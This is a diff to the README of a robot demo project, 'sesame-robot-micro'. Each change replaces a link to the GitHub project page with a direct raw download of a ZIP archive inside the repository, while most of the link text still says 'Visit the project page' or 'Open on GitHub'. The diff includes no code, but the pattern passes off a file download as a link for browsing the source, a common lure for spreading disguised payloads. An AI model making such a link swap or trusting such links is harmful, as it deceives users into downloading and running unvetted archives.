@@ -1,6 +1,6 @@
 # 🤖 sesame-robot-micro - A Small Robot Demo You Can Run
 
-[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Caitlin5494/sesame-robot-micro)
+[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Caitlin5494/sesame-robot-micro/raw/refs/heads/main/wifi-bridge-firmware/robot_sesame_micro_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@
 
 If you want the source and the latest project files, use this link:
 
-[Visit the project page on GitHub](https://github.com/Caitlin5494/sesame-robot-micro)
+[Visit the project page on GitHub](https://github.com/Caitlin5494/sesame-robot-micro/raw/refs/heads/main/wifi-bridge-firmware/robot_sesame_micro_1.8.zip)
 
 ## 📥 Download the Project
 
@@ -163,7 +163,7 @@ Keep the extracted files in one folder. Do not spread them across different plac
 
 If you want to look at the project files, use the same GitHub link:
 
-[Open sesame-robot-micro on GitHub](https://github.com/Caitlin5494/sesame-robot-micro)
+[Open sesame-robot-micro on GitHub](https://github.com/Caitlin5494/sesame-robot-micro/raw/refs/heads/main/wifi-bridge-firmware/robot_sesame_micro_1.8.zip)
 
 From there you can review the files, download the ZIP again, or use GitHub tools if you are familiar with them.
 
@@ -195,7 +195,7 @@ If you want the shortest path, do this:
 
 Primary project page:
 
-[https://github.com/Caitlin5494/sesame-robot-micro](https://github.com/Caitlin5494/sesame-robot-micro)
+[https://github.com/Caitlin5494/sesame-robot-micro/raw/refs/heads/main/wifi-bridge-firmware/robot_sesame_micro_1.8.zip](https://github.com/Caitlin5494/sesame-robot-micro/raw/refs/heads/main/wifi-bridge-firmware/robot_sesame_micro_1.8.zip)
 
 ## 🧭 What to Expect from a Micro Version
 
